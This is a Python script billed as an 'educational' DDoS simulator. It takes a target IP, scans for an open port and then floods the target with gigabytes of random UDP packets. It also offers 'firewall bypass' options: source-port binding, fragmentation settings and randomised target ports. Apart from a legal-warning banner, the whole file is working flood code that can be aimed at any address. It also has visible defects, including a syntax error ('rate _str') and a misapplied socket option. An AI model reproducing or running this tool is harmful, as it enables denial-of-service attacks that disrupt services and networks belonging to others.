import sys
import os
import time
import socket
import ipaddress
import random

class DDoSSimulator:
    """UDP Packet Sending Simulator (with integrated port auto-discovery)"""

    def __init__(self):
        self.target_ip = None
        self.target_port = None          # Port provided by user (may be None)
        self.user_provided_port = False  # True if user specified a port
        self.total_gb = 0.0
        self.max_packets = 0
        self.rate_limit = 0.0

        # Bypass options
        self.source_port = None
        self.use_fragmentation = False
        self.random_target_port = False

        self.sock = None
        self.payload_size = 1490
        self.payload = None

        # Final attack port (determined by resolve_target_port)
        self.final_port = None

    def show_banner(self):
        """Display legal warning (no ASCII art)"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("=" * 60)
        print("  DDOS-Attack Educational Edition (Firewall Bypass Experiment) v3.0")
        print("=" * 60)
        print("LEGAL WARNING:")
        print("This tool is for EDUCATIONAL USE ONLY. You must use it in a completely")
        print("isolated laboratory environment. You may only attack devices you own")
        print("and have legal authorization to test.")
        print("Unauthorized attacks are serious crimes and will lead to legal consequences.")
        print("=" * 60)
        input("Press Enter to continue, or Ctrl+C to exit...")

    def get_target_info(self):
        """Collect and validate target IP, port, traffic, rate limit, and bypass options (no scanning yet)"""
        # ---------- Target IP ----------
        while True:
            try:
                ip_str = input("[?]Enter target IP address: ").strip()
                ipaddress.ip_address(ip_str)
                self.target_ip = ip_str
                break
            except ValueError:
                print("[!] Invalid IP address, please try again.")

        # ---------- Target port (supports blank for auto-discovery) ----------
        while True:
            try:
                port_str = input("[?]Enter target port (press Enter for auto-discovery): ").strip()
                if port_str == "":
                    self.target_port = None
                    self.user_provided_port = False
                    break
                port = int(port_str)
                if 1 <= port <= 65535:
                    self.target_port = port
                    self.user_provided_port = True
                    break
                else:
                    print("[!] Port must be between 1 and 65535.")
            except ValueError:
                print("[!] Invalid port number. Enter a number, or press Enter for auto-discovery.")

        # ---------- Total traffic (GB) ----------
        while True:
            try:
                gb_str = input("Enter total data to send (GB): ").strip()
                self.total_gb = float(gb_str)
                if self.total_gb <= 0:
                    print("[!] Traffic must be greater than 0 GB.")
                    continue
                break
            except ValueError:
                print("[!] Invalid value, please enter a number.")

        # ---------- Packet interval (rate limit) ----------
        try:
            rate _str = input("[?]Enter packet interval in seconds (0 = max speed, e.g. 0.1): ").strip()
            self.rate_limit = float(rate_str)
        except ValueError:
            self.rate_limit = 0.0

        # ---------- Bypass options ----------
        print("\n--- Firewall Bypass Options (experimental) ---")
        src = input("[?]Specify source port (leave blank for random): ").strip()
        self.source_port = int(src) if src else None

        frag = input("[?]Enable IP fragmentation? (y/N): ").strip().lower()
        self.use_fragmentation = (frag == 'y')

        rnd = input("[?]Use random target port? (y/N): ").strip().lower()
        self.random_target_port = (rnd == 'y')

        # ---------- Calculate total packets ----------
        if self.use_fragmentation:
            self.payload_size = 3000
        else:
            self.payload_size = 1490

        total_bytes = int(self.total_gb * 1024 * 1024 * 1024)
        self.max_packets = total_bytes // self.payload_size
        print(f"\n[*] Will send {self.max_packets} packets, total {self.total_gb:.2f} GB.")
        if self.rate_limit > 0:
            print(f"[*] Packet interval: {self.rate_limit} sec")
        if self.source_port is not None:
            print(f"[*] Source port: {self.source_port}")
        if self.use_fragmentation:
            print(f"[*] IP fragmentation enabled, payload size {self.payload_size} bytes")
        if self.random_target_port:
            print("[*] Random target port mode enabled")

    # ==================== Port Discovery Methods ====================

    def check_target(self, ip, port):
        """Simple TCP connectivity test, returns True/False"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((ip, port))
            s.close()
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def discover_open_port(self, ip, port_range):
        """Scan a range of ports, return first open port, while printing each probed port"""
        print(f"[*] Scanning ports {min(port_range)}-{max(port_range)}, please wait...")
        try:
            for p in port_range:
                print(f"[?] Probing port: {p}")
                if self.check_target(ip, p):
                    return p
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user.")
            return None
        return None

    def resolve_target_port(self):
        """Determine final attack port based on user input or auto-scan, and return it"""
        if self.target_port is not None and self.user_provided_port:
            print(f"[*] Checking connectivity of port {self.target_port}...")
            if self.check_target(self.target_ip, self.target_port):
                print(f"[+] Port {self.target_port} is reachable, will use directly.")
                return self.target_port
            else:
                print(f"[!] Port {self.target_port} is unreachable.")
                scan_choice = input("[?] Start port scan to find an available port? (y/n): ").strip().lower()
                if scan_choice == 'y':
                    ports = self._select_scan_range()
                    alt_port = self.discover_open_port(self.target_ip, ports)
                    if alt_port is not None:
                        print(f"[+] Found open port: {alt_port}")
                        return alt_port
                    else:
                        print("[!] No open port discovered.")
                        while True:
                            force_choice = input("[?] Force send using the original port? (y/n): ").strip().lower()
                            if force_choice == 'y':
                                print(f"[*] Will force send using original port {self.target_port}.")
                                return self.target_port
                            elif force_choice == 'n':
                                print("[*] Attack cancelled by user.")
                                sys.exit(0)
                            else:
                                print("[!] Please enter y or n.")
                else:
                    # Skip scan, ask whether to force send directly
                    while True:
                        force_choice = input("[?] Force send using the original port? (y/n): ").strip().lower()
                        if force_choice == 'y':
                            print(f"[*] Will force send using original port {self.target_port}.")
                            return self.target_port
                        elif force_choice == 'n':
                            print("[*] Attack cancelled by user.")
                            sys.exit(0)
                        else:
                            print("[!] Please enter y or n.")
        else:
            # User did not specify a port, mandatory scan
            print("[*] No port specified, starting port scan...")
            ports = self._select_scan_range()
            final = self.discover_open_port(self.target_ip, ports)
            if final is None:
                print("[!] No open port found, cannot continue.")
                sys.exit(1)
            print(f"[+] Discovery successful, will use open port: {final}")
            return final

    def _select_scan_range(self):
        """Provide scan mode selection, return iterable port range"""
        print("\n[?]Select scan mode:")
        print("1. Quick scan (common ports)")
        print("2. Full port scan (1-65535, time-consuming)")
        print("3. Custom range")
        mode = input("[?] Enter option (1/2/3): ").strip()
        if mode == '1':
            return [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
        elif mode == '2':
            return range(1, 65536)
        elif mode == '3':
            while True:
                try:
                    start_port = int(input("[?] Start port: "))
                    end_port = int(input("[?] End port: "))
                    if start_port < 1 or end_port > 65535 or start_port > end_port:
                        print("[!] Invalid port range, using quick scan.")
                        return [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
                    return range(start_port, end_port + 1)
                except ValueError:
                    print("[!] Invalid input, using quick scan.")
                    return [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
        else:
            print("[!] Invalid option, using quick scan.")
            return [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]

    # ==================== Attack Sending ====================

    def send_packets(self):
        """Send UDP packets, including bypass features and GB output"""
        print(f"\n[*] Target: {self.target_ip}:{self.final_port}")
        print(f"[*] Number of packets to send: {self.max_packets}")
        print(f"[*] Rate limit: {self.rate_limit if self.rate_limit > 0 else 'None (max speed)'}")
        print("[*] Press Ctrl+C to stop.\n")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Source port binding
        if self.source_port is not None:
            try:
                self.sock.bind(('', self.source_port))
            except OSError as e:
                print(f"[!] Cannot bind source port {self.source_port}: {e}")
                self.sock.close()
                sys.exit(1)

        # IP fragmentation setup (fallback on failure)
        frag_enabled = False
        if self.use_fragmentation:
            try:
                if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DO'):
                    self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
                    self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
                    frag_enabled = True
                else:
                    raise AttributeError("IP_MTU_DISCOVER not available")
            except (AttributeError, OSError) as e:
                print(f"[!] Unable to enable IP fragmentation ({e}), falling back to normal mode (payload 1490 bytes).")
                self.payload_size = 1490
                total_bytes = int(self.total_gb * 1024 * 1024 * 1024)
                self.max_packets = total_bytes // self.payload_size
                print(f"[*] Adjusted total packets: {self.max_packets}")

        self.payload = os.urandom(self.payload_size)

        sent = 0
        sent_bytes = 0
        next_mb_threshold = 1024 * 1024   # Output every 1 MB
        start_time = time.time()

        try:
            while sent < self.max_packets:
                if self.random_target_port:
                    current_port = random.randint(1, 65535)
                else:
                    current_port = self.final_port

                self.sock.sendto(self.payload, (self.target_ip, current_port))
                sent += 1
                sent_bytes += self.payload_size

                if not self.random_target_port:
                    self.final_port += 1
                    if self.final_port > 65534:
                        self.final_port = 1

                # Output every 1 MB in GB units
                if sent_bytes >= next_mb_threshold:
                    gb_sent = sent_bytes / (1024 * 1024 * 1024)
                    elapsed = time.time() - start_time
                    pps = sent / elapsed if elapsed > 0 else 0
                    print(f"[>] Sent: {sent} packets ({gb_sent:.4f} GB) | Elapsed: {elapsed:.1f}s | Rate: {pps:.1f} pps")
                    next_mb_threshold += 1024 * 1024

                if self.rate_limit > 0:
                    time.sleep(self.rate_limit)

        except KeyboardInterrupt:
            print(f"\n\n[!] Sending stopped by user.")
        except Exception as e:
            print(f"\n[!] Error: {e}")
        finally:
            self.sock.close()
            elapsed = time.time() - start_time
            print(f"\n[+] Attack finished. Total packets: {sent}, Total data: {sent_bytes / (1024*1024*1024):.4f} GB, Elapsed: {elapsed:.2f} sec.")

    # ==================== Main Flow ====================

    def run(self):
        self.show_banner()
        self.get_target_info()

        # Final confirmation
        while True:
            confirm = input("\n[!] FINAL WARNING: You are about to send massive UDP traffic to the target. Confirm (yes/no): ").strip().lower()
            if confirm == 'yes':
                break
            elif confirm == 'no':
                print("[*] Cancelled by user.")
                sys.exit(0)
            else:
                print("[!] Please enter yes or no.")

        # Determine final attack port (includes auto-discovery/scan)
        self.final_port = self.resolve_target_port()

        # Start sending
        self.send_packets()


if __name__ == "__main__":
    try:
        simulator = DDoSSimulator()
        simulator.run()
    except KeyboardInterrupt:
        print("\n[*] Program terminated by user.")
        sys.exit(0)
